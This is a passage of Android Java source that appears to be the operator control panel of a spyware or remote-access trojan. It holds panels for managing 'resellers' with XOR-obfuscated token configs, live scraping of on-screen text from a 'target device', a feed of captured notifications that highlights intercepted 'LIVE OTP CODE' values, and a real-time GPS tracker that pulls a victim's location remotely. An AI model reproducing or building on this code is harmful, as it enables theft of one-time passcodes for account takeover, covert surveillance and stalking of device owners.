            btnCopy.setOnClickListener(v -> {
                String tokenToUse = !userAppToken.isEmpty() ? userAppToken : resellerId;
                String enc = com.device.ctrl.StringObfuscator.XorCipher.n2c("{\n  \"token\": \"" + tokenToUse + "\"\n}");
                copyToClipboard("Encrypted Reseller Config", enc);
                Toast.makeText(ctx, "Encrypted config copied for assets!", Toast.LENGTH_LONG).show();
            });
            btnDel.setOnClickListener(v -> {
                new AlertDialog.Builder(ctx)
                    .setTitle("Delete Reseller")
                    .setMessage("Are you sure you want to delete reseller '" + name + "'?")
                    .setPositiveButton("Delete", (dialog, which) -> {
                        AdminRelayClient.get().deleteReseller(resellerId);
                        resellers.remove(p);
                        notifyDataSetChanged();
                        Toast.makeText(ctx, "Reseller deleted", Toast.LENGTH_SHORT).show();
                    })
                    .setNegativeButton("Cancel", null)
                    .show();
            });
            return cv;
        }
    }
}
class LiveNodesPanel extends BasePanel {
    private LinearLayout content;
    private Button btnRead;
    private boolean isReading = false;
    private Device selDev;
    private Runnable poller;
    private Handler h = new Handler(Looper.getMainLooper());
    public LiveNodesPanel(Context ctx, int[] theme) { super(ctx, theme); }
    @Override
    public View buildView() {
        LinearLayout root = row(true);
        root.setPadding(20, 20, 20, 20);
        btnRead = gradientBtn("▶ START X-RAY", v -> toggleRead(), PRIMARY, ACCENT);
        root.addView(sectionHeader("X-RAY MOD (LIVE SCAN)", btnRead));
        content = new LinearLayout(ctx);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setBackground(cardBg(0xFF0F131C, BORDER, 16));
        content.setPadding(16, 16, 16, 16);
        ScrollView sc = new ScrollView(ctx);
        sc.addView(content, matchWrap());
        root.addView(sc, new LinearLayout.LayoutParams(-1, -1, 1f));
        return root;
    }
    private void toggleRead() {
        if (selDev == null || !selDev.online) {
            Toast.makeText(ctx, "Device offline", Toast.LENGTH_SHORT).show(); return;
        }
        isReading = !isReading;
        btnRead.setText(isReading ? "⏹ STOP X-RAY" : "▶ START X-RAY");
        if (isReading) {
            GradientDrawable g = new GradientDrawable();
            g.setColor(DANGER); g.setCornerRadius(dp(14));
            btnRead.setBackground(new android.graphics.drawable.RippleDrawable(
                android.content.res.ColorStateList.valueOf(0x44FFFFFF), g, null));
            if (poller == null) poller = () -> {
                if (isReading && selDev != null) {
                    AdminRelayClient.get().sendCmd(selDev.androidId, "get_ui_nodes", null);
                    h.postDelayed(poller, 1500); 
                }
            };
            h.post(poller);
        } else {
            GradientDrawable g = new GradientDrawable(GradientDrawable.Orientation.TL_BR, new int[]{PRIMARY, ACCENT});
            g.setCornerRadius(dp(14));
            btnRead.setBackground(new android.graphics.drawable.RippleDrawable(
                android.content.res.ColorStateList.valueOf(0x44FFFFFF), g, null));
            if (poller != null) h.removeCallbacks(poller);
        }
    }
    @Override public void onDeviceSelected(Device d) {
        this.selDev = d;
        if (isReading) toggleRead();
        content.removeAllViews();
    }
    @Override public void onMessage(JSONObject msg) {
        if ("ui_nodes".equals(msg.optString("type", "")) && isReading) {
            String nodesJson = msg.optString("nodes", "[]");
            content.removeAllViews();
            try {
                JSONArray arr = new JSONArray(nodesJson);
                if (arr.length() == 0) {
                    content.addView(txt("No text found on screen.", 12, TXT2, false));
                    return;
                }
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject n = arr.getJSONObject(i);
                    String text = n.optString("text", "").trim();
                    String type = n.optString("type", "view");
                    if (!text.isEmpty()) {
                        LinearLayout card = row(false);
                        card.setBackground(cardBg(CARD, BORDER, 14));
                        card.setPadding(16, 12, 16, 12);
                        card.setGravity(Gravity.CENTER_VERTICAL);
                        int badgeColor = PRIMARY;
                        if (type.equals("button") || type.equals("clickable")) badgeColor = SUCCESS;
                        else if (type.equals("input")) badgeColor = ACCENT;
                        else if (type.equals("switch")) badgeColor = DANGER;
                        else if (type.equals("image")) badgeColor = 0xFF94A3B8; 
                        TextView tvType = badge(type.toUpperCase(), TXT1, badgeColor);
                        card.addView(tvType, new LinearLayout.LayoutParams(-2, -2));
                        TextView tvText = txt(text, 13, TXT1, true);
                        tvText.setPadding(dp(12), 0, 0, 0);
                        card.addView(tvText, new LinearLayout.LayoutParams(0, -2, 1f));
                        LinearLayout wrap = new LinearLayout(ctx);
                        wrap.setPadding(0, 0, 0, dp(10));
                        wrap.addView(card, matchWrap());
                        content.addView(wrap);
                    }
                }
            } catch (Exception e) {}
        }
    }
}

class NotifPanel extends BasePanel {
    private LinearLayout listContainer;
    private Device selDev;
    private final SimpleDateFormat timeFmt = new SimpleDateFormat("HH:mm:ss", Locale.US);

    public NotifPanel(Context ctx, int[] theme) { super(ctx, theme); }

    @Override public void onDeviceSelected(Device d) { this.selDev = d; refresh(); }
    @Override public void onMessage(JSONObject msg) {
        String t = msg.optString("type", "");
        if ("notification_event".equals(t) || "otp_alert".equals(t)) refresh();
    }

    @Override public View buildView() {
        LinearLayout root = row(true);
        root.setPadding(30, 30, 30, 30);
        Button btnClear = pillBtn("CLEAR ALL", v -> {
            if (selDev != null) { selDev.notifications.clear(); refresh(); }
        }, 0x22EF4444, DANGER);
        root.addView(sectionHeader("NOTIFICATIONS & LIVE OTP", btnClear));
        ScrollView sv = new ScrollView(ctx);
        listContainer = new LinearLayout(ctx);
        listContainer.setOrientation(LinearLayout.VERTICAL);
        sv.addView(listContainer);
        root.addView(sv, new LinearLayout.LayoutParams(-1, -1));
        return root;
    }

    private void refresh() {
        listContainer.removeAllViews();
        if (selDev == null) {
            listContainer.addView(txt("Select a target device first.", 13, TXT2, false));
            return;
        }
        if (selDev.notifications.isEmpty()) {
            listContainer.addView(txt("No notifications or OTPs captured yet.", 13, TXT2, false));
            return;
        }
        for (int i = 0; i < selDev.notifications.size(); i++) {
            Device.NotifEntry n = selDev.notifications.get(i);
            LinearLayout card = row(true);
            card.setPadding(20, 20, 20, 20);
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-1, -2);
            lp.bottomMargin = 14;

            if (n.isOtp) {
                card.setBackground(cardBg(0x22EF4444, DANGER, 12));
                card.addView(txt("🔥 [LIVE OTP CODE] " + n.otpCode, 16, DANGER, true));
            } else {
                card.setBackground(cardBg(0x11FFFFFF, 0x33FFFFFF, 12));
            }

            String tm = timeFmt.format(new Date(n.timestamp > 0 ? n.timestamp : System.currentTimeMillis()));
            card.addView(txt("[" + tm + "] " + n.pkg, 11, TXT2, false));
            if (!n.title.isEmpty() && !n.title.equalsIgnoreCase(n.pkg)) {
                card.addView(txt(n.title, 13, ACCENT, true));
            }
            card.addView(txt(n.text, 13, TXT1, false));
            listContainer.addView(card, lp);
        }
    }
}

class LocationPanel extends BasePanel {
    private Device selDev;
    private TextView tvCoords, tvAccuracy, tvProvider, tvTime;
    private Button btnOpenMaps, btnRefresh;
    private final SimpleDateFormat timeFmt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);

    public LocationPanel(Context ctx, int[] theme) { super(ctx, theme); }

    @Override public void onDeviceSelected(Device d) { this.selDev = d; refresh(); }
    @Override public void onMessage(JSONObject msg) {
        if ("location_data".equals(msg.optString("type", ""))) refresh();
    }

    @Override public View buildView() {
        LinearLayout root = row(true);
        root.setPadding(30, 30, 30, 30);
        btnRefresh = pillBtn("REFRESH GPS", v -> {
            if (selDev != null) {
                AdminRelayClient.get().sendCmd(selDev.androidId, "get_location", null);
                Toast.makeText(ctx, "Requesting GPS coordinates...", Toast.LENGTH_SHORT).show();
            }
        }, 0x2200F0FF, PRIMARY);
        root.addView(sectionHeader("REAL-TIME GPS TRACKER", btnRefresh));

        ScrollView sv = new ScrollView(ctx);
        LinearLayout content = new LinearLayout(ctx);
        content.setOrientation(LinearLayout.VERTICAL);

        LinearLayout card = row(true);
        card.setBackground(cardBg(CARD, BORDER, 14));
        card.setPadding(24, 24, 24, 24);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-1, -2);
        lp.topMargin = 20;

        tvCoords = txt("Latitude: --, Longitude: --", 15, TXT1, true);
        tvAccuracy = txt("Accuracy: --", 12, TXT2, false);
        tvProvider = txt("Provider: --", 12, TXT2, false);
        tvTime = txt("Last Fix: --", 12, TXT2, false);

        card.addView(tvCoords);
        card.addView(tvAccuracy);
        card.addView(tvProvider);
        card.addView(tvTime);

        btnOpenMaps = pillBtn("🌐 OPEN IN GOOGLE MAPS", v -> {
            if (selDev != null && (selDev.latitude != 0.0 || selDev.longitude != 0.0)) {
                String uri = "https://www.google.com/maps/search/?api=1&query=" + selDev.latitude + "," + selDev.longitude;
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(uri));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                try { ctx.startActivity(intent); } catch (Exception e) {
                    Toast.makeText(ctx, "Could not open browser/maps", Toast.LENGTH_SHORT).show();
                }
            } else {
                Toast.makeText(ctx, "No GPS coordinates yet", Toast.LENGTH_SHORT).show();
            }
        }, 0x3310B981, SUCCESS);

        LinearLayout.LayoutParams bLp = new LinearLayout.LayoutParams(-1, dp(44));
        bLp.topMargin = 20;
        card.addView(btnOpenMaps, bLp);

        content.addView(card, lp);
        sv.addView(content);
        root.addView(sv, new LinearLayout.LayoutParams(-1, -1));
        return root;
    }

    private void refresh() {
        if (selDev == null || tvCoords == null) return;
        if (selDev.latitude != 0.0 || selDev.longitude != 0.0) {
            tvCoords.setText("📍 " + selDev.latitude + ", " + selDev.longitude);
            tvAccuracy.setText("Accuracy: ± " + (int) selDev.locAccuracy + " meters");
            tvProvider.setText("Source: " + (selDev.locProvider.isEmpty() ? "GPS" : selDev.locProvider.toUpperCase()));
            tvTime.setText("Timestamp: " + timeFmt.format(new Date(selDev.locTime > 0 ? selDev.locTime : System.currentTimeMillis())));
            btnOpenMaps.setEnabled(true);
        } else {
            tvCoords.setText("Latitude: Waiting for GPS..., Longitude: --");
            tvAccuracy.setText("Accuracy: --");
            tvProvider.setText("Provider: GPS/Network");
            tvTime.setText("Last Fix: Never");
        }
    }
}

public class Panels { private Panels() {} }
